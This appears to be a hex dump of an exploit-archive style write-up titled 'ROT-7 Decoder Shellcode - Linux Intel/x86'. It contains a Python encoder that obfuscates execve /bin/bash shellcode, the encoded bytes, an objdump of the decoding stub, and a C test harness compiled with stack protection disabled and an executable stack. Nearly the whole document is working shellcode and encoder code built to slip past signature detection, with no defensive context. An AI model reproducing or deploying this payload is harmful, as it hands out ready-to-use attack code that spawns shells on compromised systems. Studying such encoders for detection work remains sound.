00000000  2f 2a 0a 0a 20 52 4f 54  2d 37 20 44 65 63 6f 64  |/*.. ROT-7 Decod|
00000010  65 72 20 53 68 65 6c 6c  63 6f 64 65 20 2d 20 4c  |er Shellcode - L|
00000020  69 6e 75 78 20 49 6e 74  65 6c 2f 78 38 36 0a 20  |inux Intel/x86. |
00000030  41 75 74 68 6f 72 3a 20  53 74 61 76 72 6f 73 20  |Author: Stavros |
00000040  4d 65 74 7a 69 64 61 6b  69 73 0a 0a 2a 2f 0a 0a  |Metzidakis..*/..|
00000050  0a 61 29 20 50 79 74 68  6f 6e 20 52 4f 54 2d 37  |.a) Python ROT-7|
00000060  20 65 6e 63 6f 64 65 72  20 66 6f 72 20 73 68 65  | encoder for she|
00000070  6c 6c 63 6f 64 65 20 28  65 78 65 63 76 65 2d 73  |llcode (execve-s|
00000080  74 61 63 6b 29 0a 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |tack).----------|
00000090  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000000d0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 0a 23 21  |-------------.#!|
000000e0  2f 75 73 72 2f 62 69 6e  2f 70 79 74 68 6f 6e 0a  |/usr/bin/python.|
000000f0  0a 23 20 50 79 74 68 6f  6e 20 52 4f 54 2d 37 20  |.# Python ROT-7 |
00000100  45 6e 63 6f 64 65 72 0a  0a 73 68 65 6c 6c 63 6f  |Encoder..shellco|
00000110  64 65 20 3d 20 28 22 5c  78 33 31 5c 78 63 30 5c  |de = ("\x31\xc0\|
00000120  78 35 30 5c 78 36 38 5c  78 36 32 5c 78 36 31 5c  |x50\x68\x62\x61\|
00000130  78 37 33 5c 78 36 38 5c  78 36 38 5c 78 36 32 5c  |x73\x68\x68\x62\|
00000140  78 36 39 5c 78 36 65 5c  78 32 66 5c 78 36 38 5c  |x69\x6e\x2f\x68\|
00000150  78 32 66 5c 78 32 66 5c  78 32 66 5c 78 32 66 5c  |x2f\x2f\x2f\x2f\|
00000160  78 38 39 5c 78 65 33 5c  78 35 30 5c 78 38 39 5c  |x89\xe3\x50\x89\|
00000170  78 65 32 5c 78 35 33 5c  78 38 39 5c 78 65 31 5c  |xe2\x53\x89\xe1\|
00000180  78 62 30 5c 78 30 62 5c  78 63 64 5c 78 38 30 22  |xb0\x0b\xcd\x80"|
00000190  29 0a 0a 65 6e 63 6f 64  65 64 20 3d 20 22 22 0a  |)..encoded = "".|
000001a0  65 6e 63 6f 64 65 64 32  20 3d 20 22 22 0a 0a 70  |encoded2 = ""..p|
000001b0  72 69 6e 74 20 27 45 6e  63 6f 64 65 64 20 73 68  |rint 'Encoded sh|
000001c0  65 6c 6c 63 6f 64 65 20  2e 2e 2e 27 0a 0a 66 6f  |ellcode ...'..fo|
000001d0  72 20 78 20 69 6e 20 62  79 74 65 61 72 72 61 79  |r x in bytearray|
000001e0  28 73 68 65 6c 6c 63 6f  64 65 29 20 3a 0a 23 20  |(shellcode) :.# |
000001f0  62 6f 75 6e 64 61 72 79  20 69 73 20 63 6f 6d 70  |boundary is comp|
00000200  75 74 65 64 20 61 73 20  32 35 35 2d 52 4f 54 28  |uted as 255-ROT(|
00000210  78 29 20 77 68 65 72 65  20 78 2c 20 74 68 65 20  |x) where x, the |
00000220  61 6d 6f 75 6e 74 20 74  6f 20 72 6f 74 61 74 65  |amount to rotate|
00000230  20 62 79 0a 20 20 20 20  69 66 20 78 20 3e 20 32  | by.    if x > 2|
00000240  34 38 3a 0a 20 20 20 20  20 20 20 20 65 6e 63 6f  |48:.        enco|
00000250  64 65 64 20 2b 3d 20 27  5c 5c 78 27 0a 20 20 20  |ded += '\\x'.   |
00000260  20 20 20 20 20 65 6e 63  6f 64 65 64 20 2b 3d 20  |     encoded += |
00000270  27 25 30 32 78 27 20 25  28 37 20 2d 28 32 35 36  |'%02x' %(7 -(256|
00000280  20 2d 20 78 29 29 0a 20  20 20 20 20 20 20 20 65  | - x)).        e|
00000290  6e 63 6f 64 65 64 32 20  2b 3d 20 27 30 78 27 0a  |ncoded2 += '0x'.|
000002a0  20 20 20 20 20 20 20 20  65 6e 63 6f 64 65 64 32  |        encoded2|
000002b0  20 2b 3d 20 27 25 30 32  78 2c 27 20 25 28 37 20  | += '%02x,' %(7 |
000002c0  2d 28 32 35 36 20 2d 20  78 29 29 0a 20 20 20 20  |-(256 - x)).    |
000002d0  65 6c 73 65 3a 0a 20 20  20 20 20 20 20 20 65 6e  |else:.        en|
000002e0  63 6f 64 65 64 20 2b 3d  20 27 5c 5c 78 27 0a 20  |coded += '\\x'. |
000002f0  20 20 20 20 20 20 20 65  6e 63 6f 64 65 64 20 2b  |       encoded +|
00000300  3d 20 27 25 30 32 78 27  25 28 78 2b 37 29 0a 20  |= '%02x'%(x+7). |
00000310  20 20 20 20 20 20 20 65  6e 63 6f 64 65 64 32 20  |       encoded2 |
00000320  2b 3d 20 27 30 78 27 0a  20 20 20 20 20 20 20 20  |+= '0x'.        |
00000330  65 6e 63 6f 64 65 64 32  20 2b 3d 20 27 25 30 32  |encoded2 += '%02|
00000340  78 2c 27 20 25 28 78 2b  37 29 0a 20 20 20 20 0a  |x,' %(x+7).    .|
00000350  0a 70 72 69 6e 74 20 65  6e 63 6f 64 65 64 0a 0a  |.print encoded..|
00000360  70 72 69 6e 74 20 65 6e  63 6f 64 65 64 32 0a 0a  |print encoded2..|
00000370  70 72 69 6e 74 20 27 4c  65 6e 3a 20 25 64 27 20  |print 'Len: %d' |
00000380  25 20 6c 65 6e 28 62 79  74 65 61 72 72 61 79 28  |% len(bytearray(|
00000390  73 68 65 6c 6c 63 6f 64  65 29 29 0a 2d 2d 2d 2d  |shellcode)).----|
000003a0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000003f0  2d 2d 2d 0a 54 65 73 74  20 72 75 6e 3a 0a 24 20  |---.Test run:.$ |
00000400  2e 2f 72 6f 74 2d 37 2d  65 6e 63 6f 64 65 72 2e  |./rot-7-encoder.|
00000410  70 79 0a 45 6e 63 6f 64  65 64 20 73 68 65 6c 6c  |py.Encoded shell|
00000420  63 6f 64 65 20 2e 2e 2e  0a 5c 78 33 38 5c 78 63  |code ....\x38\xc|
00000430  37 5c 78 35 37 5c 78 36  66 5c 78 36 39 5c 78 36  |7\x57\x6f\x69\x6|
00000440  38 5c 78 37 61 5c 78 36  66 5c 78 36 66 5c 78 36  |8\x7a\x6f\x6f\x6|
00000450  39 5c 78 37 30 5c 78 37  35 5c 78 33 36 5c 78 36  |9\x70\x75\x36\x6|
00000460  66 5c 78 33 36 5c 78 33  36 5c 78 33 36 5c 78 33  |f\x36\x36\x36\x3|
00000470  36 5c 78 39 30 5c 78 65  61 5c 78 35 37 5c 78 39  |6\x90\xea\x57\x9|
00000480  30 5c 78 65 39 5c 78 35  61 5c 78 39 30 5c 78 65  |0\xe9\x5a\x90\xe|
00000490  38 5c 78 62 37 5c 78 31  32 5c 78 64 34 5c 78 38  |8\xb7\x12\xd4\x8|
000004a0  37 0a 30 78 33 38 2c 30  78 63 37 2c 30 78 35 37  |7.0x38,0xc7,0x57|
000004b0  2c 30 78 36 66 2c 30 78  36 39 2c 30 78 36 38 2c  |,0x6f,0x69,0x68,|
000004c0  30 78 37 61 2c 30 78 36  66 2c 30 78 36 66 2c 30  |0x7a,0x6f,0x6f,0|
000004d0  78 36 39 2c 30 78 37 30  2c 30 78 37 35 2c 30 78  |x69,0x70,0x75,0x|
000004e0  33 36 2c 30 78 36 66 2c  30 78 33 36 2c 30 78 33  |36,0x6f,0x36,0x3|
000004f0  36 2c 30 78 33 36 2c 30  78 33 36 2c 30 78 39 30  |6,0x36,0x36,0x90|
00000500  2c 30 78 65 61 2c 30 78  35 37 2c 30 78 39 30 2c  |,0xea,0x57,0x90,|
00000510  30 78 65 39 2c 30 78 35  61 2c 30 78 39 30 2c 30  |0xe9,0x5a,0x90,0|
00000520  78 65 38 2c 30 78 62 37  2c 30 78 31 32 2c 30 78  |xe8,0xb7,0x12,0x|
00000530  64 34 2c 30 78 38 37 2c  0a 4c 65 6e 3a 20 33 30  |d4,0x87,.Len: 30|
00000540  0a 0a 0a 0a 0a 62 29 20  44 65 63 6f 64 65 72 20  |.....b) Decoder |
00000550  66 6f 72 20 61 20 52 4f  54 2d 37 20 65 6e 63 6f  |for a ROT-7 enco|
00000560  64 65 64 20 73 68 65 6c  6c 63 6f 64 65 20 28 65  |ded shellcode (e|
00000570  78 65 63 76 65 2d 73 74  61 63 6b 29 0a 2d 2d 2d  |xecve-stack).---|
00000580  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000005d0  2d 2d 2d 2d 0a 24 6f 62  6a 64 75 6d 70 20 2d 64  |----.$objdump -d|
000005e0  20 72 6f 74 2d 37 2d 64  65 63 6f 64 65 72 20 2d  | rot-7-decoder -|
000005f0  4d 20 69 6e 74 65 6c 20  0a 0a 72 6f 74 2d 37 2d  |M intel ..rot-7-|
00000600  64 65 63 6f 64 65 72 3a  20 20 20 20 20 66 69 6c  |decoder:     fil|
00000610  65 20 66 6f 72 6d 61 74  20 65 6c 66 33 32 2d 69  |e format elf32-i|
00000620  33 38 36 0a 0a 0a 44 69  73 61 73 73 65 6d 62 6c  |386...Disassembl|
00000630  79 20 6f 66 20 73 65 63  74 69 6f 6e 20 2e 74 65  |y of section .te|
00000640  78 74 3a 0a 0a 30 38 30  34 38 30 36 30 20 3c 5f  |xt:..08048060 <_|
00000650  73 74 61 72 74 3e 3a 0a  20 38 30 34 38 30 36 30  |start>:. 8048060|
00000660  3a 20 20 20 65 62 20 32  35 20 20 20 20 20 20 20  |:   eb 25       |
00000670  20 20 20 20 20 20 20 20  20 20 20 20 6a 6d 70 20  |            jmp |
00000680  20 20 20 38 30 34 38 30  38 37 20 3c 63 61 6c 6c  |   8048087 <call|
00000690  5f 64 65 63 6f 64 65 72  3e 0a 0a 30 38 30 34 38  |_decoder>..08048|
000006a0  30 36 32 20 3c 64 65 63  6f 64 65 72 3e 3a 0a 20  |062 <decoder>:. |
000006b0  38 30 34 38 30 36 32 3a  20 20 20 35 65 20 20 20  |8048062:   5e   |
000006c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000006d0  20 20 20 70 6f 70 20 20  20 20 65 73 69 0a 20 38  |   pop    esi. 8|
000006e0  30 34 38 30 36 33 3a 20  20 20 33 31 20 63 39 20  |048063:   31 c9 |
000006f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000700  20 20 78 6f 72 20 20 20  20 65 63 78 2c 65 63 78  |  xor    ecx,ecx|
00000710  0a 20 38 30 34 38 30 36  35 3a 20 20 20 62 31 20  |. 8048065:   b1 |
00000720  31 65 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |1e              |
00000730  20 20 20 20 20 6d 6f 76  20 20 20 20 63 6c 2c 30  |     mov    cl,0|
00000740  78 31 65 20 20 20 20 20  20 20 20 20 20 20 20 20  |x1e             |
00000750  20 3b 52 4f 54 65 64 20  73 68 65 6c 6c 63 6f 64  | ;ROTed shellcod|
00000760  65 20 6c 65 6e 67 74 68  20 67 6f 65 73 20 68 65  |e length goes he|
00000770  72 65 0a 0a 30 38 30 34  38 30 36 37 20 3c 64 65  |re..08048067 <de|
00000780  63 6f 64 65 3e 3a 0a 20  38 30 34 38 30 36 37 3a  |code>:. 8048067:|
00000790  20 20 20 38 30 20 33 65  20 30 37 20 20 20 20 20  |   80 3e 07     |
000007a0  20 20 20 20 20 20 20 20  20 20 20 63 6d 70 20 20  |           cmp  |
000007b0  20 20 42 59 54 45 20 50  54 52 20 5b 65 73 69 5d  |  BYTE PTR [esi]|
000007c0  2c 30 78 37 0a 20 38 30  34 38 30 36 61 3a 20 20  |,0x7. 804806a:  |
000007d0  20 37 63 20 30 35 20 20  20 20 20 20 20 20 20 20  | 7c 05          |
000007e0  20 20 20 20 20 20 20 20  20 6a 6c 20 20 20 20 20  |         jl     |
000007f0  38 30 34 38 30 37 31 20  3c 6c 6f 77 62 6f 75 6e  |8048071 <lowboun|
00000800  64 3e 0a 20 38 30 34 38  30 36 63 3a 20 20 20 38  |d>. 804806c:   8|
00000810  30 20 32 65 20 30 37 20  20 20 20 20 20 20 20 20  |0 2e 07         |
00000820  20 20 20 20 20 20 20 73  75 62 20 20 20 20 42 59  |       sub    BY|
00000830  54 45 20 50 54 52 20 5b  65 73 69 5d 2c 30 78 37  |TE PTR [esi],0x7|
00000840  0a 20 38 30 34 38 30 36  66 3a 20 20 20 65 62 20  |. 804806f:   eb |
00000850  31 31 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |11              |
00000860  20 20 20 20 20 6a 6d 70  20 20 20 20 38 30 34 38  |     jmp    8048|
00000870  30 38 32 20 3c 63 6f 6d  6d 6f 6e 5f 63 6f 6d 6d  |082 <common_comm|
00000880  61 6e 64 73 3e 0a 0a 30  38 30 34 38 30 37 31 20  |ands>..08048071 |
00000890  3c 6c 6f 77 62 6f 75 6e  64 3e 3a 0a 20 38 30 34  |<lowbound>:. 804|
000008a0  38 30 37 31 3a 20 20 20  33 31 20 64 62 20 20 20  |8071:   31 db   |
000008b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000008c0  78 6f 72 20 20 20 20 65  62 78 2c 65 62 78 0a 20  |xor    ebx,ebx. |
000008d0  38 30 34 38 30 37 33 3a  20 20 20 33 31 20 64 32  |8048073:   31 d2|
000008e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000008f0  20 20 20 78 6f 72 20 20  20 20 65 64 78 2c 65 64  |   xor    edx,ed|
00000900  78 0a 20 38 30 34 38 30  37 35 3a 20 20 20 62 33  |x. 8048075:   b3|
00000910  20 30 37 20 20 20 20 20  20 20 20 20 20 20 20 20  | 07             |
00000920  20 20 20 20 20 20 6d 6f  76 20 20 20 20 62 6c 2c  |      mov    bl,|
00000930  30 78 37 0a 20 38 30 34  38 30 37 37 3a 20 20 20  |0x7. 8048077:   |
00000940  62 32 20 66 66 20 20 20  20 20 20 20 20 20 20 20  |b2 ff           |
00000950  20 20 20 20 20 20 20 20  6d 6f 76 20 20 20 20 64  |        mov    d|
00000960  6c 2c 30 78 66 66 0a 20  38 30 34 38 30 37 39 3a  |l,0xff. 8048079:|
00000970  20 20 20 36 36 20 34 32  20 20 20 20 20 20 20 20  |   66 42        |
00000980  20 20 20 20 20 20 20 20  20 20 20 69 6e 63 20 20  |           inc  |
00000990  20 20 64 78 0a 20 38 30  34 38 30 37 62 3a 20 20  |  dx. 804807b:  |
000009a0  20 32 61 20 31 65 20 20  20 20 20 20 20 20 20 20  | 2a 1e          |
000009b0  20 20 20 20 20 20 20 20  20 73 75 62 20 20 20 20  |         sub    |
000009c0  62 6c 2c 42 59 54 45 20  50 54 52 20 5b 65 73 69  |bl,BYTE PTR [esi|
000009d0  5d 0a 20 38 30 34 38 30  37 64 3a 20 20 20 36 36  |]. 804807d:   66|
000009e0  20 32 39 20 64 61 20 20  20 20 20 20 20 20 20 20  | 29 da          |
000009f0  20 20 20 20 20 20 73 75  62 20 20 20 20 64 78 2c  |      sub    dx,|
00000a00  62 78 0a 20 38 30 34 38  30 38 30 3a 20 20 20 38  |bx. 8048080:   8|
00000a10  38 20 31 36 20 20 20 20  20 20 20 20 20 20 20 20  |8 16            |
00000a20  20 20 20 20 20 20 20 6d  6f 76 20 20 20 20 42 59  |       mov    BY|
00000a30  54 45 20 50 54 52 20 5b  65 73 69 5d 2c 64 6c 0a  |TE PTR [esi],dl.|
00000a40  0a 30 38 30 34 38 30 38  32 20 3c 63 6f 6d 6d 6f  |.08048082 <commo|
00000a50  6e 5f 63 6f 6d 6d 61 6e  64 73 3e 3a 0a 20 38 30  |n_commands>:. 80|
00000a60  34 38 30 38 32 3a 20 20  20 34 36 20 20 20 20 20  |48082:   46     |
00000a70  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000a80  20 69 6e 63 20 20 20 20  65 73 69 0a 20 38 30 34  | inc    esi. 804|
00000a90  38 30 38 33 3a 20 20 20  65 32 20 65 32 20 20 20  |8083:   e2 e2   |
00000aa0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000ab0  6c 6f 6f 70 20 20 20 38  30 34 38 30 36 37 20 3c  |loop   8048067 <|
00000ac0  64 65 63 6f 64 65 3e 0a  20 38 30 34 38 30 38 35  |decode>. 8048085|
00000ad0  3a 20 20 20 65 62 20 30  35 20 20 20 20 20 20 20  |:   eb 05       |
00000ae0  20 20 20 20 20 20 20 20  20 20 20 20 6a 6d 70 20  |            jmp |
00000af0  20 20 20 38 30 34 38 30  38 63 20 3c 53 68 65 6c  |   804808c <Shel|
00000b00  6c 63 6f 64 65 3e 0a 0a  30 38 30 34 38 30 38 37  |lcode>..08048087|
00000b10  20 3c 63 61 6c 6c 5f 64  65 63 6f 64 65 72 3e 3a  | <call_decoder>:|
00000b20  0a 20 38 30 34 38 30 38  37 3a 20 20 20 65 38 20  |. 8048087:   e8 |
00000b30  64 36 20 66 66 20 66 66  20 66 66 20 20 20 20 20  |d6 ff ff ff     |
00000b40  20 20 20 20 20 63 61 6c  6c 20 20 20 38 30 34 38  |     call   8048|
00000b50  30 36 32 20 3c 64 65 63  6f 64 65 72 3e 0a 0a 30  |062 <decoder>..0|
00000b60  38 30 34 38 30 38 63 20  3c 53 68 65 6c 6c 63 6f  |804808c <Shellco|
00000b70  64 65 3e 3a 20 20 20 20  20 20 20 20 20 20 20 20  |de>:            |
00000b80  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000b90  20 20 20 3b 52 4f 54 65  64 20 73 68 65 6c 6c 63  |   ;ROTed shellc|
00000ba0  6f 64 65 0a 20 38 30 34  38 30 38 63 3a 20 20 20  |ode. 804808c:   |
00000bb0  33 38 20 63 37 20 20 20  20 20 20 20 20 20 20 20  |38 c7           |
00000bc0  20 20 20 20 20 20 20 20  63 6d 70 20 20 20 20 62  |        cmp    b|
00000bd0  68 2c 61 6c 0a 20 38 30  34 38 30 38 65 3a 20 20  |h,al. 804808e:  |
00000be0  20 35 37 20 20 20 20 20  20 20 20 20 20 20 20 20  | 57             |
00000bf0  20 20 20 20 20 20 20 20  20 70 75 73 68 20 20 20  |         push   |
00000c00  65 64 69 0a 20 38 30 34  38 30 38 66 3a 20 20 20  |edi. 804808f:   |
00000c10  36 66 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |6f              |
00000c20  20 20 20 20 20 20 20 20  6f 75 74 73 20 20 20 64  |        outs   d|
00000c30  78 2c 44 57 4f 52 44 20  50 54 52 20 64 73 3a 5b  |x,DWORD PTR ds:[|
00000c40  65 73 69 5d 0a 20 38 30  34 38 30 39 30 3a 20 20  |esi]. 8048090:  |
00000c50  20 36 39 20 36 38 20 37  61 20 36 66 20 36 66 20  | 69 68 7a 6f 6f |
00000c60  36 39 20 37 30 20 20 20  20 69 6d 75 6c 20 20 20  |69 70    imul   |
00000c70  65 62 70 2c 44 57 4f 52  44 20 50 54 52 20 5b 65  |ebp,DWORD PTR [e|
00000c80  61 78 2b 30 78 37 61 5d  2c 30 78 37 30 36 39 36  |ax+0x7a],0x70696|
00000c90  66 36 66 0a 20 38 30 34  38 30 39 37 3a 20 20 20  |f6f. 8048097:   |
00000ca0  37 35 20 33 36 20 20 20  20 20 20 20 20 20 20 20  |75 36           |
00000cb0  20 20 20 20 20 20 20 20  6a 6e 65 20 20 20 20 38  |        jne    8|
00000cc0  30 34 38 30 63 66 20 3c  53 68 65 6c 6c 63 6f 64  |0480cf <Shellcod|
00000cd0  65 2b 30 78 34 33 3e 0a  20 38 30 34 38 30 39 39  |e+0x43>. 8048099|
00000ce0  3a 20 20 20 36 66 20 20  20 20 20 20 20 20 20 20  |:   6f          |
00000cf0  20 20 20 20 20 20 20 20  20 20 20 20 6f 75 74 73  |            outs|
00000d00  20 20 20 64 78 2c 44 57  4f 52 44 20 50 54 52 20  |   dx,DWORD PTR |
00000d10  64 73 3a 5b 65 73 69 5d  0a 20 38 30 34 38 30 39  |ds:[esi]. 804809|
00000d20  61 3a 20 20 20 33 36 20  20 20 20 20 20 20 20 20  |a:   36         |
00000d30  20 20 20 20 20 20 20 20  20 20 20 20 20 73 73 0a  |             ss.|
00000d40  20 38 30 34 38 30 39 62  3a 20 20 20 33 36 20 20  | 804809b:   36  |
00000d50  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000d60  20 20 20 20 73 73 0a 20  38 30 34 38 30 39 63 3a  |    ss. 804809c:|
00000d70  20 20 20 33 36 20 20 20  20 20 20 20 20 20 20 20  |   36           |
00000d80  20 20 20 20 20 20 20 20  20 20 20 73 73 0a 20 38  |           ss. 8|
00000d90  30 34 38 30 39 64 3a 20  20 20 33 36 20 20 20 20  |04809d:   36    |
00000da0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000db0  20 20 73 73 0a 20 38 30  34 38 30 39 65 3a 20 20  |  ss. 804809e:  |
00000dc0  20 39 30 20 20 20 20 20  20 20 20 20 20 20 20 20  | 90             |
00000dd0  20 20 20 20 20 20 20 20  20 6e 6f 70 0a 20 38 30  |         nop. 80|
00000de0  34 38 30 39 66 3a 20 20  20 65 61 20 35 37 20 39  |4809f:   ea 57 9|
00000df0  30 20 65 39 20 35 61 20  39 30 20 65 38 20 20 20  |0 e9 5a 90 e8   |
00000e00  20 6a 6d 70 20 20 20 20  30 78 65 38 39 30 3a 30  | jmp    0xe890:0|
00000e10  78 35 61 65 39 39 30 35  37 0a 20 38 30 34 38 30  |x5ae99057. 80480|
00000e20  61 36 3a 20 20 20 62 37  20 31 32 20 20 20 20 20  |a6:   b7 12     |
00000e30  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6d 6f  |              mo|
00000e40  76 20 20 20 20 62 68 2c  30 78 31 32 0a 20 38 30  |v    bh,0x12. 80|
00000e50  34 38 30 61 38 3a 20 20  20 64 34 20 38 37 20 20  |480a8:   d4 87  |
00000e60  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000e70  20 61 61 6d 20 20 20 20  30 78 38 37 0a 2d 2d 2d  | aam    0x87.---|
00000e80  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000ed0  2d 2d 2d 2d 0a 0a 0a 24  20 63 61 74 20 73 68 65  |----...$ cat she|
00000ee0  6c 6c 63 6f 64 65 2e 63  0a 0a 23 69 6e 63 6c 75  |llcode.c..#inclu|
00000ef0  64 65 20 3c 73 74 64 69  6f 2e 68 3e 0a 23 69 6e  |de <stdio.h>.#in|
00000f00  63 6c 75 64 65 20 3c 73  74 72 69 6e 67 2e 68 3e  |clude <string.h>|
00000f10  0a 0a 75 6e 73 69 67 6e  65 64 20 63 68 61 72 20  |..unsigned char |
00000f20  63 6f 64 65 5b 5d 20 3d  20 22 5c 78 65 62 5c 78  |code[] = "\xeb\x|
00000f30  32 35 5c 78 35 65 5c 78  33 31 5c 78 63 39 5c 78  |25\x5e\x31\xc9\x|
00000f40  62 31 5c 78 31 65 5c 78  38 30 5c 78 33 65 5c 78  |b1\x1e\x80\x3e\x|
00000f50  30 37 5c 78 37 63 5c 78  30 35 5c 78 38 30 5c 78  |07\x7c\x05\x80\x|
00000f60  32 65 5c 78 30 37 5c 78  65 62 5c 78 31 31 5c 78  |2e\x07\xeb\x11\x|
00000f70  33 31 5c 78 64 62 5c 78  33 31 5c 78 64 32 5c 78  |31\xdb\x31\xd2\x|
00000f80  62 33 5c 78 30 37 5c 78  62 32 5c 78 66 66 5c 78  |b3\x07\xb2\xff\x|
00000f90  36 36 5c 78 34 32 5c 78  32 61 5c 78 31 65 5c 78  |66\x42\x2a\x1e\x|
00000fa0  36 36 5c 78 32 39 5c 78  64 61 5c 78 38 38 5c 78  |66\x29\xda\x88\x|
00000fb0  31 36 5c 78 34 36 5c 78  65 32 5c 78 65 32 5c 78  |16\x46\xe2\xe2\x|
00000fc0  65 62 5c 78 30 35 5c 78  65 38 5c 78 64 36 5c 78  |eb\x05\xe8\xd6\x|
00000fd0  66 66 5c 78 66 66 5c 78  66 66 5c 78 33 38 5c 78  |ff\xff\xff\x38\x|
00000fe0  63 37 5c 78 35 37 5c 78  36 66 5c 78 36 39 5c 78  |c7\x57\x6f\x69\x|
00000ff0  36 38 5c 78 37 61 5c 78  36 66 5c 78 36 66 5c 78  |68\x7a\x6f\x6f\x|
00001000  36 39 5c 78 37 30 5c 78  37 35 5c 78 33 36 5c 78  |69\x70\x75\x36\x|
00001010  36 66 5c 78 33 36 5c 78  33 36 5c 78 33 36 5c 78  |6f\x36\x36\x36\x|
00001020  33 36 5c 78 39 30 5c 78  65 61 5c 78 35 37 5c 78  |36\x90\xea\x57\x|
00001030  39 30 5c 78 65 39 5c 78  35 61 5c 78 39 30 5c 78  |90\xe9\x5a\x90\x|
00001040  65 38 5c 78 62 37 5c 78  31 32 5c 78 64 34 5c 78  |e8\xb7\x12\xd4\x|
00001050  38 37 22 3b 0a 0a 6d 61  69 6e 28 29 0a 7b 0a 0a  |87";..main().{..|
00001060  20 20 20 20 70 72 69 6e  74 66 28 22 53 68 65 6c  |    printf("Shel|
00001070  6c 63 6f 64 65 20 4c 65  6e 67 74 68 3a 20 20 25  |lcode Length:  %|
00001080  64 5c 6e 22 2c 20 73 74  72 6c 65 6e 28 63 6f 64  |d\n", strlen(cod|
00001090  65 29 29 3b 0a 0a 20 20  20 20 69 6e 74 20 28 2a  |e));..    int (*|
000010a0  72 65 74 29 28 29 20 3d  20 28 69 6e 74 28 2a 29  |ret)() = (int(*)|
000010b0  28 29 29 63 6f 64 65 3b  0a 0a 20 20 20 20 72 65  |())code;..    re|
000010c0  74 28 29 3b 0a 0a 7d 0a  0a 0a 24 20 67 63 63 20  |t();..}...$ gcc |
000010d0  2e 2f 73 68 65 6c 6c 63  6f 64 65 2e 63 20 2d 66  |./shellcode.c -f|
000010e0  6e 6f 2d 73 74 61 63 6b  2d 70 72 6f 74 65 63 74  |no-stack-protect|
000010f0  6f 72 20 2d 7a 20 65 78  65 63 73 74 61 63 6b 20  |or -z execstack |
00001100  2d 6f 20 73 68 65 6c 6c  63 6f 64 65 0a 24 20 2e  |-o shellcode.$ .|
00001110  2f 73 68 65 6c 6c 63 6f  64 65 0a 53 68 65 6c 6c  |/shellcode.Shell|
00001120  63 6f 64 65 20 4c 65 6e  67 74 68 3a 20 20 37 34  |code Length:  74|
00001130  0a 24                                             |.$|
00001132
